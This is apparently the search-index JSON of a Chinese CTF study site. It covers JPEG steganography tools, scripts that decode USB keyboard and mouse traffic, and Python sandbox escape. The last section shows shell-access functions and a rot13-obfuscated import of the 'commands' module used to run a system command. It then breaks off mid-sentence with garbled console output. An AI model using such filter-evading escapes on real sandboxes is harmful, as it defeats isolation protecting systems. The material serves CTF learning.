{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to MkDocs \u00b6 For full documentation visit mkdocs.org . Commands \u00b6 mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs help - Print this help message. Project layout \u00b6 1 2 3 4 mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files. mkdocs \u53c2\u8003","title":"Welcome to MkDocs"},{"location":"#welcome-to-mkdocs","text":"For full documentation visit mkdocs.org .","title":"Welcome to MkDocs"},{"location":"#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs help - Print this help message.","title":"Commands"},{"location":"#project-layout","text":"1 2 3 4 mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files. mkdocs \u53c2\u8003","title":"Project layout"},{"location":"MISC/","text":"\u4e00\u4e9b\u5e38\u89c1\u7684MISC\u59ff\u52bf \u00b6","title":"\u4e00\u4e9b\u5e38\u89c1\u7684MISC\u59ff\u52bf"},{"location":"MISC/#misc","text":"","title":"\u4e00\u4e9b\u5e38\u89c1\u7684MISC\u59ff\u52bf"},{"location":"MISC/JPEG/","text":"JPEG\u683c\u5f0f\u7684\u56fe\u7247\u9690\u5199 \u00b6 ctf-wiki\u4e0a\u63d0\u5230\u7684\u5de5\u5177\u6709\u4e09\u79cd\uff0c\u5206\u522b\u662f Stegdetect , JPHS , SilentEye \u5176\u4e2d Stegdetect \u53ef\u4ee5\u7528\u6765\u68c0\u6d4b\u56fe\u7247\u4e2d\u662f\u5426\u5305\u542b\u76f8\u5173\u7684\u9690\u85cf\u4fe1\u606f\uff0c\u4f7f\u75281\uff5e3\u9897\u661f\u6765\u6807\u8bc6 \u9690\u85cf\u4fe1\u606f\u5b58\u5728\u7684\u53ef\u80fd\u6027\u5927\u5c0f\uff0c3\u9897\u661f\u8868\u793a\u9690\u85cf\u4fe1\u606f\u5b58\u5728\u7684\u53ef\u80fd\u6027\u6700\u5927\u3002 Stegdetect \u7684\u5b89\u88c5 \u53c2\u8003 \u00b6 JPhide\u9690\u5199 outguess\u5de5\u5177\u4f7f\u7528 \u5165\u95e8CTF\u9690\u5199","title":"JPEG\u683c\u5f0f\u7684\u56fe\u7247\u9690\u5199"},{"location":"MISC/JPEG/#jpeg","text":"ctf-wiki\u4e0a\u63d0\u5230\u7684\u5de5\u5177\u6709\u4e09\u79cd\uff0c\u5206\u522b\u662f Stegdetect , JPHS , SilentEye \u5176\u4e2d Stegdetect \u53ef\u4ee5\u7528\u6765\u68c0\u6d4b\u56fe\u7247\u4e2d\u662f\u5426\u5305\u542b\u76f8\u5173\u7684\u9690\u85cf\u4fe1\u606f\uff0c\u4f7f\u75281\uff5e3\u9897\u661f\u6765\u6807\u8bc6 \u9690\u85cf\u4fe1\u606f\u5b58\u5728\u7684\u53ef\u80fd\u6027\u5927\u5c0f\uff0c3\u9897\u661f\u8868\u793a\u9690\u85cf\u4fe1\u606f\u5b58\u5728\u7684\u53ef\u80fd\u6027\u6700\u5927\u3002 Stegdetect \u7684\u5b89\u88c5","title":"JPEG\u683c\u5f0f\u7684\u56fe\u7247\u9690\u5199"},{"location":"MISC/JPEG/#_1","text":"JPhide\u9690\u5199 outguess\u5de5\u5177\u4f7f\u7528 \u5165\u95e8CTF\u9690\u5199","title":"\u53c2\u8003"},{"location":"MISC/USB\u6d41\u91cf\u5206\u6790/","text":"USB\u6d41\u91cf\u5206\u6790 \u00b6 USB capture \u00b6 USB\u6d41\u91cf\u7684\u6355\u83b7\u53ef\u4ee5\u4f7f\u7528wireshark\u6216\u8005usbpcap\u6765\u8fdb\u884c\uff0c\u6700\u65b0\u7248\u672c\u7684wireshark\u5df2\u7ecf\u652f\u6301USB\u63a5\u53e3\u7684\u6355\u83b7\uff0c\u4e14\u5728\u5b89\u88c5\u65f6\u4f1a\u63d0\u793ausbpcap\u7684\u5b89\u88c5\uff0c\u5f53\u524d\u7f51\u4e0a\u5df2\u6709\u76f8\u5173\u4e2d\u6587\u8d44\u6599\u5bf9wireshark\u6293\u53d6usb\u6570\u636e\u5305\u7684\u65b9\u6cd5\u8fdb\u884c\u8bb2\u89e3\uff0c\u611f\u5174\u8da3\u7684\u8bfb\u8005\u53ef\u9605\u8bfb\u53c2\u8003\u94fe\u63a5\uff0c\u5728\u6b64\u6211\u4eec\u4f7f\u7528\u4e00\u79cd\u76f8\u5bf9\u7b80\u5355\u7684\u65b9\u5f0f\uff0c\u5373\u76f4\u63a5\u91c7\u7528usbpcap\u6355\u83b7USB\u6d41\u91cf\u3002\u8be5\u8f6f\u4ef6\u7684\u4e0b\u8f7d\u5730\u5740\u4e3a http://desowin.org/usbpcap/ \uff0c\u53ef\u652f\u630132\u4f4d\u4ee5\u53ca64\u4f4d\u7684winxp\u81f3win10\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u5b8c\u6210\u540e\u987b\u91cd\u542f\u673a\u5668\u6216\u8005\u6309\u7167\u63d0\u793a\u9009\u62e9\u91cd\u542f\u6240\u6709USB\u8bbe\u5907\u3002 \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u76f4\u63a5\u53cc\u51fbUSBPcapCMD.exe\uff0c\u6309\u7167\u63d0\u793a\u4fe1\u606f\u9009\u62e9filter\uff0c\u8f93\u5165\u6587\u4ef6\u540d\uff0c\u4fbf\u53ef\u6109\u5feb\u5730\u7b49\u4ea7\u751f\u7684\u4fe1\u606f\u88ab\u6355\u83b7\u4e86\uff0c\u7a0b\u5e8f\u8fd0\u884c\u754c\u9762\u5982\u4e0b\u56fe\uff1a \u6587\u4ef6\u4e0b\u8f7d \u952e\u76d8\u6d41\u91cf\u89e3\u6790 \u00b6 USB\u534f\u8bae\u7684\u6570\u636e\u90e8\u5206\u5728Leftover Capture Data\u57df\u4e4b\u4e2d\uff0c\u53f3\u952eleftover capture data \u2013> \u5e94\u7528\u4e3a\u5217\uff0c\u53ef\u4ee5\u5c06\u8be5\u57df\u7684\u503c\u5728\u4e3b\u9762\u677f\u4e0a\u663e\u793a\uff0c\u952e\u76d8\u6570\u636e\u5305\u7684\u6570\u636e\u957f\u5ea6\u4e3a8\u4e2a\u5b57\u8282\uff0c\u51fb\u952e\u4fe1\u606f\u96c6\u4e2d\u5728\u7b2c3\u4e2a\u5b57\u8282\uff0c\u6bcf\u6b21key stroke\u90fd\u4f1a\u4ea7\u751f\u4e00\u4e2akeyboard event usb packet \uff0c\u5982\u4e0b\u56fe\uff1a \u4f7f\u7528wireshark\u81ea\u5e26\u7684tshark\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u4ee5\u5c06 leftover capture data\u5355\u72ec\u63d0\u53d6\u51fa\u6765\uff0c\u5177\u4f53\u547d\u4ee4\u4e3a\uff1a 1 tshark.exe -r usb1.pcap -T fields -e usb.capdata > usbdata.txt \u7136\u540e\u6211\u4eec\u9700\u8981\u7f16\u5199\u811a\u672c\u4ece\u5f97\u51fa\u7684userdata.txt\u6587\u4ef6\u4e2d\u8fc7\u6ee4\u51fa\u952e\u76d8\u51fb\u952e\u76f8\u5173\u7684\u6d41\u91cf\uff0c\u5e76\u6839\u636e\u4e0a\u8ff0\u6620\u5c04\u8868\uff0c\u5c06\u952e\u76d8\u6309\u952e\u6309\u7167\u5bf9\u5e94\u5173\u7cfb\u8f93\u51fa\u51fa\u6765\uff0c\u8fd9\u91cc\u9644\u4e0a\u7b80\u8981\u7684\u811a\u672c\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 mappings = { 0x04 : \"A\" , 0x05 : \"B\" , 0x06 : \"C\" , 0x07 : \"D\" , 0x08 : \"E\" , 0x09 : \"F\" , 0x0A : \"G\" , 0x0B : \"H\" , 0x0C : \"I\" , 0x0D : \"J\" , 0x0E : \"K\" , 0x0F : \"L\" , 0x10 : \"M\" , 0x11 : \"N\" , 0x12 : \"O\" , 0x13 : \"P\" , 0x14 : \"Q\" , 0x15 : \"R\" , 0x16 : \"S\" , 0x17 : \"T\" , 0x18 : \"U\" , 0x19 : \"V\" , 0x1A : \"W\" , 0x1B : \"X\" , 0x1C : \"Y\" , 0x1D : \"Z\" , 0x1E : \"1\" , 0x1F : \"2\" , 0x20 : \"3\" , 0x21 : \"4\" , 0x22 : \"5\" , 0x23 : \"6\" , 0x24 : \"7\" , 0x25 : \"8\" , 0x26 : \"9\" , 0x27 : \"0\" , 0x28 : \"n\" , 0x2a : \"[DEL]\" , 0X2B : \" \" , 0x2C : \" \" , 0x2D : \"-\" , 0x2E : \"=\" , 0x2F : \"[\" , 0x30 : \"]\" , 0x31 : \" \\\" , 0x32:\" ~ \", 0x33:\" ; \", 0x34:\" '\", 0x36:\",\", 0x37:\".\" } nums = [] keys = open ( 'usbdata.txt' ) for line in keys : if line [ 0 ] != '0' or line [ 1 ] != '0' or line [ 3 ] != '0' or line [ 4 ] != '0' or line [ 9 ] != '0' or line [ 10 ] != '0' or line [ 12 ] != '0' or line [ 13 ] != '0' or line [ 15 ] != '0' or line [ 16 ] != '0' or line [ 18 ] != '0' or line [ 19 ] != '0' or line [ 21 ] != '0' or line [ 22 ] != '0' : continue nums . append ( int ( line [ 6 : 8 ], 16 )) keys . close () output = \"\" for n in nums : if n == 0 : continue if n in mappings : output += mappings [ n ] else : output += '[unknown]' print 'output :n' + output \u9f20\u6807\u6d41\u91cf\u89e3\u6790 \u00b6 \u89e3\u51b3\u672c\u9898\u9700\u8981\u628a\u9f20\u6807\u6d41\u91cf\u8fd8\u539f\u51fa\u6765\uff0c\u7136\u800c\u9f20\u6807\u4e0e\u952e\u76d8\u4e0d\u540c\uff0c\u9f20\u6807\u79fb\u52a8\u65f6\u8868\u73b0\u4e3a\u8fde\u7eed\u6027\uff0c\u4e0e\u952e\u76d8\u51fb\u952e\u7684\u79bb\u6563\u6027\u4e0d\u4e00\u6837\uff0c\u4e0d\u8fc7\u5b9e\u9645\u4e0a\u9f20\u6807\u52a8\u4f5c\u6240\u4ea7\u751f\u7684\u6570\u636e\u5305\u4e5f\u662f\u79bb\u6563\u7684\uff0c\u6bd5\u7adf\u8ba1\u7b97\u673a\u8868\u73b0\u7684\u8fde\u7eed\u6027\u4fe1\u606f\u90fd\u662f\u7531\u5927\u91cf\u79bb\u6563\u4fe1\u606f\u6784\u6210\u7684\u3002 \u9996\u5148\u540c\u6837\u4f7f\u7528tshark \u547d\u4ee4\u5c06cap data\u63d0\u53d6\u51fa\u6765: 1 tshark.exe -r usb2.pcap -T fields -e usb.capdata > usbdata.txt \u6bcf\u4e00\u4e2a\u6570\u636e\u5305\u7684\u6570\u636e\u533a\u6709\u56db\u4e2a\u5b57\u8282\uff0c\u7b2c\u4e00\u4e2a\u5b57\u8282\u4ee3\u8868\u6309\u952e\uff0c\u5f53\u53d60x00\u65f6\uff0c\u4ee3\u8868\u6ca1\u6709\u6309\u952e\u3001\u4e3a0x01\u65f6\uff0c\u4ee3\u8868\u6309\u5de6\u952e\uff0c\u4e3a0x02\u65f6\uff0c\u4ee3\u8868\u5f53\u524d\u6309\u952e\u4e3a\u53f3\u952e\u3002\u7b2c\u4e8c\u4e2a\u5b57\u8282\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2asigned byte\u7c7b\u578b\uff0c\u5176\u6700\u9ad8\u4f4d\u4e3a\u7b26\u53f7\u4f4d\uff0c\u5f53\u8fd9\u4e2a\u503c\u4e3a\u6b63\u65f6\uff0c\u4ee3\u8868\u9f20\u6807\u6c34\u5e73\u53f3\u79fb\u591a\u5c11\u50cf\u7d20\uff0c\u4e3a\u8d1f\u65f6\uff0c\u4ee3\u8868\u6c34\u5e73\u5de6\u79fb\u591a\u5c11\u50cf\u7d20\u3002\u7b2c\u4e09\u4e2a\u5b57\u8282\u4e0e\u7b2c\u4e8c\u5b57\u8282\u7c7b\u4f3c\uff0c\u4ee3\u8868\u5782\u76f4\u4e0a\u4e0b\u79fb\u52a8\u7684\u504f\u79fb\u3002 \u4e86\u89e3\u534f\u8bae\u76f8\u5173\u7ea6\u5b9a\u4e4b\u540e\uff0c\u53ef\u7f16\u5199\u811a\u672c\u5c06\u6570\u636e\u5305\u7684\u5185\u5bb9\u53d8\u6210\u4e00\u7cfb\u5217\u70b9\u7684\u96c6\u5408\uff0c\u4e3a\u4e86\u533a\u5206\u5de6\u53f3\u6309\u952e\uff0c\u53ef\u4ee5\u7279\u610f\u5bf9\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\u4f5c\u4e00\u4e0b\u5224\u65ad\u3002\u76f8\u5173\u811a\u672c\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 nums = [] keys = open ( 'data.txt' , 'r' ) posx = 0 posy = 0 for line in keys : if len ( line ) != 12 : continue x = int ( line [ 3 : 5 ], 16 ) y = int ( line [ 6 : 8 ], 16 ) if x > 127 : x -= 256 if y > 127 : y -= 256 posx += x posy += y btn_flag = int ( line [ 0 : 2 ], 16 ) # 1 for left , 2 for right , 0 for nothing if btn_flag == 1 : print posx , posy keys . close () \u672c\u9898\u7684flag\u85cf\u5728\u53f3\u952e\u4fe1\u606f\u4e2d\uff0c\u5f53btn_flag \u53d62\u65f6\uff0c\u8fd0\u884c\u811a\u672c\u53ef\u4ee5\u5f97\u5230\u4e00\u7cfb\u5217\u5750\u6807\u70b9\uff1a \u5f97\u5230\u8fd9\u4e9b\u70b9\u4e4b\u540e\uff0c\u9700\u8981\u5c06\u4ed6\u4eec\u753b\u51fa\u6765\uff0c\u56e0\u800c\u9700\u8981\u8f85\u4ee5gnuplot \u6216\u8005\u5176\u4ed6\u7684\u7ed8\u56fe\u5de5\u5177\uff0cgnuplot\u7684\u547d\u4ee4\u4e3a\"plot inputfile\"\uff0c\u8fd0\u884c\u5982\u4e0b\uff1a \u53c2\u8003 \u00b6 \u5b89\u5168\u5ba2","title":"USB\u6d41\u91cf\u5206\u6790"},{"location":"MISC/USB\u6d41\u91cf\u5206\u6790/#usb","text":"","title":"USB\u6d41\u91cf\u5206\u6790"},{"location":"MISC/USB\u6d41\u91cf\u5206\u6790/#usb-capture","text":"USB\u6d41\u91cf\u7684\u6355\u83b7\u53ef\u4ee5\u4f7f\u7528wireshark\u6216\u8005usbpcap\u6765\u8fdb\u884c\uff0c\u6700\u65b0\u7248\u672c\u7684wireshark\u5df2\u7ecf\u652f\u6301USB\u63a5\u53e3\u7684\u6355\u83b7\uff0c\u4e14\u5728\u5b89\u88c5\u65f6\u4f1a\u63d0\u793ausbpcap\u7684\u5b89\u88c5\uff0c\u5f53\u524d\u7f51\u4e0a\u5df2\u6709\u76f8\u5173\u4e2d\u6587\u8d44\u6599\u5bf9wireshark\u6293\u53d6usb\u6570\u636e\u5305\u7684\u65b9\u6cd5\u8fdb\u884c\u8bb2\u89e3\uff0c\u611f\u5174\u8da3\u7684\u8bfb\u8005\u53ef\u9605\u8bfb\u53c2\u8003\u94fe\u63a5\uff0c\u5728\u6b64\u6211\u4eec\u4f7f\u7528\u4e00\u79cd\u76f8\u5bf9\u7b80\u5355\u7684\u65b9\u5f0f\uff0c\u5373\u76f4\u63a5\u91c7\u7528usbpcap\u6355\u83b7USB\u6d41\u91cf\u3002\u8be5\u8f6f\u4ef6\u7684\u4e0b\u8f7d\u5730\u5740\u4e3a http://desowin.org/usbpcap/ \uff0c\u53ef\u652f\u630132\u4f4d\u4ee5\u53ca64\u4f4d\u7684winxp\u81f3win10\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u5b8c\u6210\u540e\u987b\u91cd\u542f\u673a\u5668\u6216\u8005\u6309\u7167\u63d0\u793a\u9009\u62e9\u91cd\u542f\u6240\u6709USB\u8bbe\u5907\u3002 \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u76f4\u63a5\u53cc\u51fbUSBPcapCMD.exe\uff0c\u6309\u7167\u63d0\u793a\u4fe1\u606f\u9009\u62e9filter\uff0c\u8f93\u5165\u6587\u4ef6\u540d\uff0c\u4fbf\u53ef\u6109\u5feb\u5730\u7b49\u4ea7\u751f\u7684\u4fe1\u606f\u88ab\u6355\u83b7\u4e86\uff0c\u7a0b\u5e8f\u8fd0\u884c\u754c\u9762\u5982\u4e0b\u56fe\uff1a \u6587\u4ef6\u4e0b\u8f7d","title":"USB capture"},{"location":"MISC/USB\u6d41\u91cf\u5206\u6790/#_1","text":"USB\u534f\u8bae\u7684\u6570\u636e\u90e8\u5206\u5728Leftover Capture Data\u57df\u4e4b\u4e2d\uff0c\u53f3\u952eleftover capture data \u2013> \u5e94\u7528\u4e3a\u5217\uff0c\u53ef\u4ee5\u5c06\u8be5\u57df\u7684\u503c\u5728\u4e3b\u9762\u677f\u4e0a\u663e\u793a\uff0c\u952e\u76d8\u6570\u636e\u5305\u7684\u6570\u636e\u957f\u5ea6\u4e3a8\u4e2a\u5b57\u8282\uff0c\u51fb\u952e\u4fe1\u606f\u96c6\u4e2d\u5728\u7b2c3\u4e2a\u5b57\u8282\uff0c\u6bcf\u6b21key stroke\u90fd\u4f1a\u4ea7\u751f\u4e00\u4e2akeyboard event usb packet \uff0c\u5982\u4e0b\u56fe\uff1a \u4f7f\u7528wireshark\u81ea\u5e26\u7684tshark\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u4ee5\u5c06 leftover capture data\u5355\u72ec\u63d0\u53d6\u51fa\u6765\uff0c\u5177\u4f53\u547d\u4ee4\u4e3a\uff1a 1 tshark.exe -r usb1.pcap -T fields -e usb.capdata > usbdata.txt \u7136\u540e\u6211\u4eec\u9700\u8981\u7f16\u5199\u811a\u672c\u4ece\u5f97\u51fa\u7684userdata.txt\u6587\u4ef6\u4e2d\u8fc7\u6ee4\u51fa\u952e\u76d8\u51fb\u952e\u76f8\u5173\u7684\u6d41\u91cf\uff0c\u5e76\u6839\u636e\u4e0a\u8ff0\u6620\u5c04\u8868\uff0c\u5c06\u952e\u76d8\u6309\u952e\u6309\u7167\u5bf9\u5e94\u5173\u7cfb\u8f93\u51fa\u51fa\u6765\uff0c\u8fd9\u91cc\u9644\u4e0a\u7b80\u8981\u7684\u811a\u672c\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 mappings = { 0x04 : \"A\" , 0x05 : \"B\" , 0x06 : \"C\" , 0x07 : \"D\" , 0x08 : \"E\" , 0x09 : \"F\" , 0x0A : \"G\" , 0x0B : \"H\" , 0x0C : \"I\" , 0x0D : \"J\" , 0x0E : \"K\" , 0x0F : \"L\" , 0x10 : \"M\" , 0x11 : \"N\" , 0x12 : \"O\" , 0x13 : \"P\" , 0x14 : \"Q\" , 0x15 : \"R\" , 0x16 : \"S\" , 0x17 : \"T\" , 0x18 : \"U\" , 0x19 : \"V\" , 0x1A : \"W\" , 0x1B : \"X\" , 0x1C : \"Y\" , 0x1D : \"Z\" , 0x1E : \"1\" , 0x1F : \"2\" , 0x20 : \"3\" , 0x21 : \"4\" , 0x22 : \"5\" , 0x23 : \"6\" , 0x24 : \"7\" , 0x25 : \"8\" , 0x26 : \"9\" , 0x27 : \"0\" , 0x28 : \"n\" , 0x2a : \"[DEL]\" , 0X2B : \" \" , 0x2C : \" \" , 0x2D : \"-\" , 0x2E : \"=\" , 0x2F : \"[\" , 0x30 : \"]\" , 0x31 : \" \\\" , 0x32:\" ~ \", 0x33:\" ; \", 0x34:\" '\", 0x36:\",\", 0x37:\".\" } nums = [] keys = open ( 'usbdata.txt' ) for line in keys : if line [ 0 ] != '0' or line [ 1 ] != '0' or line [ 3 ] != '0' or line [ 4 ] != '0' or line [ 9 ] != '0' or line [ 10 ] != '0' or line [ 12 ] != '0' or line [ 13 ] != '0' or line [ 15 ] != '0' or line [ 16 ] != '0' or line [ 18 ] != '0' or line [ 19 ] != '0' or line [ 21 ] != '0' or line [ 22 ] != '0' : continue nums . append ( int ( line [ 6 : 8 ], 16 )) keys . close () output = \"\" for n in nums : if n == 0 : continue if n in mappings : output += mappings [ n ] else : output += '[unknown]' print 'output :n' + output","title":"\u952e\u76d8\u6d41\u91cf\u89e3\u6790"},{"location":"MISC/USB\u6d41\u91cf\u5206\u6790/#_2","text":"\u89e3\u51b3\u672c\u9898\u9700\u8981\u628a\u9f20\u6807\u6d41\u91cf\u8fd8\u539f\u51fa\u6765\uff0c\u7136\u800c\u9f20\u6807\u4e0e\u952e\u76d8\u4e0d\u540c\uff0c\u9f20\u6807\u79fb\u52a8\u65f6\u8868\u73b0\u4e3a\u8fde\u7eed\u6027\uff0c\u4e0e\u952e\u76d8\u51fb\u952e\u7684\u79bb\u6563\u6027\u4e0d\u4e00\u6837\uff0c\u4e0d\u8fc7\u5b9e\u9645\u4e0a\u9f20\u6807\u52a8\u4f5c\u6240\u4ea7\u751f\u7684\u6570\u636e\u5305\u4e5f\u662f\u79bb\u6563\u7684\uff0c\u6bd5\u7adf\u8ba1\u7b97\u673a\u8868\u73b0\u7684\u8fde\u7eed\u6027\u4fe1\u606f\u90fd\u662f\u7531\u5927\u91cf\u79bb\u6563\u4fe1\u606f\u6784\u6210\u7684\u3002 \u9996\u5148\u540c\u6837\u4f7f\u7528tshark \u547d\u4ee4\u5c06cap data\u63d0\u53d6\u51fa\u6765: 1 tshark.exe -r usb2.pcap -T fields -e usb.capdata > usbdata.txt \u6bcf\u4e00\u4e2a\u6570\u636e\u5305\u7684\u6570\u636e\u533a\u6709\u56db\u4e2a\u5b57\u8282\uff0c\u7b2c\u4e00\u4e2a\u5b57\u8282\u4ee3\u8868\u6309\u952e\uff0c\u5f53\u53d60x00\u65f6\uff0c\u4ee3\u8868\u6ca1\u6709\u6309\u952e\u3001\u4e3a0x01\u65f6\uff0c\u4ee3\u8868\u6309\u5de6\u952e\uff0c\u4e3a0x02\u65f6\uff0c\u4ee3\u8868\u5f53\u524d\u6309\u952e\u4e3a\u53f3\u952e\u3002\u7b2c\u4e8c\u4e2a\u5b57\u8282\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2asigned byte\u7c7b\u578b\uff0c\u5176\u6700\u9ad8\u4f4d\u4e3a\u7b26\u53f7\u4f4d\uff0c\u5f53\u8fd9\u4e2a\u503c\u4e3a\u6b63\u65f6\uff0c\u4ee3\u8868\u9f20\u6807\u6c34\u5e73\u53f3\u79fb\u591a\u5c11\u50cf\u7d20\uff0c\u4e3a\u8d1f\u65f6\uff0c\u4ee3\u8868\u6c34\u5e73\u5de6\u79fb\u591a\u5c11\u50cf\u7d20\u3002\u7b2c\u4e09\u4e2a\u5b57\u8282\u4e0e\u7b2c\u4e8c\u5b57\u8282\u7c7b\u4f3c\uff0c\u4ee3\u8868\u5782\u76f4\u4e0a\u4e0b\u79fb\u52a8\u7684\u504f\u79fb\u3002 \u4e86\u89e3\u534f\u8bae\u76f8\u5173\u7ea6\u5b9a\u4e4b\u540e\uff0c\u53ef\u7f16\u5199\u811a\u672c\u5c06\u6570\u636e\u5305\u7684\u5185\u5bb9\u53d8\u6210\u4e00\u7cfb\u5217\u70b9\u7684\u96c6\u5408\uff0c\u4e3a\u4e86\u533a\u5206\u5de6\u53f3\u6309\u952e\uff0c\u53ef\u4ee5\u7279\u610f\u5bf9\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\u4f5c\u4e00\u4e0b\u5224\u65ad\u3002\u76f8\u5173\u811a\u672c\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 nums = [] keys = open ( 'data.txt' , 'r' ) posx = 0 posy = 0 for line in keys : if len ( line ) != 12 : continue x = int ( line [ 3 : 5 ], 16 ) y = int ( line [ 6 : 8 ], 16 ) if x > 127 : x -= 256 if y > 127 : y -= 256 posx += x posy += y btn_flag = int ( line [ 0 : 2 ], 16 ) # 1 for left , 2 for right , 0 for nothing if btn_flag == 1 : print posx , posy keys . close () \u672c\u9898\u7684flag\u85cf\u5728\u53f3\u952e\u4fe1\u606f\u4e2d\uff0c\u5f53btn_flag \u53d62\u65f6\uff0c\u8fd0\u884c\u811a\u672c\u53ef\u4ee5\u5f97\u5230\u4e00\u7cfb\u5217\u5750\u6807\u70b9\uff1a \u5f97\u5230\u8fd9\u4e9b\u70b9\u4e4b\u540e\uff0c\u9700\u8981\u5c06\u4ed6\u4eec\u753b\u51fa\u6765\uff0c\u56e0\u800c\u9700\u8981\u8f85\u4ee5gnuplot \u6216\u8005\u5176\u4ed6\u7684\u7ed8\u56fe\u5de5\u5177\uff0cgnuplot\u7684\u547d\u4ee4\u4e3a\"plot inputfile\"\uff0c\u8fd0\u884c\u5982\u4e0b\uff1a","title":"\u9f20\u6807\u6d41\u91cf\u89e3\u6790"},{"location":"MISC/USB\u6d41\u91cf\u5206\u6790/#_3","text":"\u5b89\u5168\u5ba2","title":"\u53c2\u8003"},{"location":"MISC/python\u6c99\u76d2/","text":"python\u6c99\u76d2 \u00b6 python\u6c99\u7bb1\u9003\u9038\u6982\u8ff0 \u00b6 \u4f7f\u7528os\u5305\u4e2d\u7684popen,system\u4e24\u4e2a\u51fd\u6570\u6765\u76f4\u63a5\u6267\u884cshell \u4f7f\u7528commands\u6a21\u5757\u4e2d\u7684\u65b9\u6cd5 \u4f7f\u7528subprocess \u4f7f\u7528\u5199\u6587\u4ef6\u5230\u6307\u5b9a\u4f4d\u7f6e,\u518d\u4f7f\u7528\u5176\u4ed6\u8f85\u52a9\u624b\u6bb5 \u603b\u4f53\u6765\u8bf4,\u6211\u4eec\u4f7f\u7528\u4ee5\u4e0b\u51e0\u4e2a\u51fd\u6570,\u5c31\u53ef\u4ee5\u76f4\u63a5\u6109\u5feb\u7684\u62ff\u5230shell\u5566! \u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u59ff\u52bf\uff1a __class__ \u8fd4\u56de\u5bf9\u5e94\u7684\u7c7b __base__ \u8fd4\u56de\u5bf9\u5e94\u7684\u57fa\u7c7b __subclassess__ \u8fd4\u56de\u5bf9\u5e94\u7684\u5b50\u7c7b 1 2 In [ 6 ]: [] . __class__ . __base__ . __subclasses__ ()[ 0 ] Out [ 6 ]: itertools . dropwhile python\u91cd\u8981\u7684\u9b54\u6cd5\u51fd\u6570\u548c\u5c5e\u6027 \u00b6 \u540d\u79f0 \u4ecb\u7ecd __dict__ \u8fd9\u4e2a\u5c5e\u6027\u4e2d\u5b58\u653e\u7740\u7c7b\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5bf9\u5e94\u7684\u952e\u503c\u5bf9,\u5b9e\u6d4bmodule\u4e5f\u6709\u8fd9\u4e2a\u5c5e\u6027 __class__ \u8fd4\u56de\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u5e94\u7684\u7c7b\u578b __base__ \u8fd4\u56de\u4e00\u4e2a\u7c7b\u6240\u7ee7\u627f\u7684\u57fa\u7c7b __subclasses__() \u8fd4\u56de\u8be5\u7c7b\u7684\u6240\u6709\u5b50\u7c7b __mro__ python\u652f\u6301\u591a\u91cd\u7ee7\u627f\uff0c\u5728\u89e3\u6790 __init__ \u65f6\uff0c\u5b9a\u4e49\u89e3\u6790\u987a\u5e8f\u7684\u662f\u5b50\u7c7b\u7684 __mro__ \u5c5e\u6027\uff08\u503c\u662f\u7c7b\u7684\u5143\u7ec4\uff09 __slots__ \u9650\u5236\u7c7b\u52a8\u6001\u6dfb\u52a0\u5c5e\u6027 __getattribute__() \u83b7\u53d6\u5c5e\u6027\u6216\u65b9\u6cd5\uff0c\u5bf9\u6a21\u5757\u548c\u7c7b\u90fd\u6709\u6548 __getitem__() \u4ee5\u7d22\u5f15\u53d6\u503c\u6216\u8005\u952e\u53d6\u503c __globals__ \u8fd4\u56de\u51fd\u6570\u6240\u5728\u6a21\u5757\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u6240\u6709\u53d8\u91cf \u5982\u4f55import \u00b6 __import__ \u662f\u4e00\u4e2a\u51fd\u6570 1 2 3 4 5 In [ 4 ]: f3ck = __import__ ( \"pbzznaqf\" . decode ( 'rot_13' )) In [ 5 ]: print f3ck . getoutput ( 'ipconfig' ) '{' \ufffd\ufffd\ufffd\ufffd\ufffd\u06b2\ufffd\ufffd\ufffd\ufffd\u2cbf\ufffd\ufffd\ufffd\ue8ec\u04b2\ufffd\ufffd\ufffd\u01ff\ufffd\ufffd\ufffd\ufffd\u0435\u0133\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd \u4f7f\u7528 importlib 1 2 3 4 5 6 7 In [6]: import importlib In [7]: f3ck = importlib.import_module(\"pbzznaqf\".decode('rot_13')) In [8]: print f3ck.getoutput('ipconfig') '{' \ufffd\ufffd\ufffd\ufffd\ufffd\u06b2\ufffd\ufffd\ufffd\ufffd\u2cbf\ufffd\ufffd\ufffd\ue8ec\u04b2\ufffd\ufffd\ufffd\u01ff\ufffd\ufffd\ufffd\ufffd\u0435\u0133\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd import \u8fdb\u9636 \u00b6 \u5728python\u4e2d,\u6211\u4eec\u77e5\u9053,\u4e0d\u7528\u5f15\u5165\u76f4\u63a5\u4f7f\u7528\u7684\u5185\u7f6e\u51fd\u6570\u79f0\u4e3a builtin \u51fd\u6570,\u968f\u7740 __builtin__ \u8fd9\u4e00\u4e2amodule \u81ea\u52a8\u88ab\u5f15\u5165\u5230\u73af\u5883\u4e2d (\u5728python3.x \u7248\u672c\u4e2d, 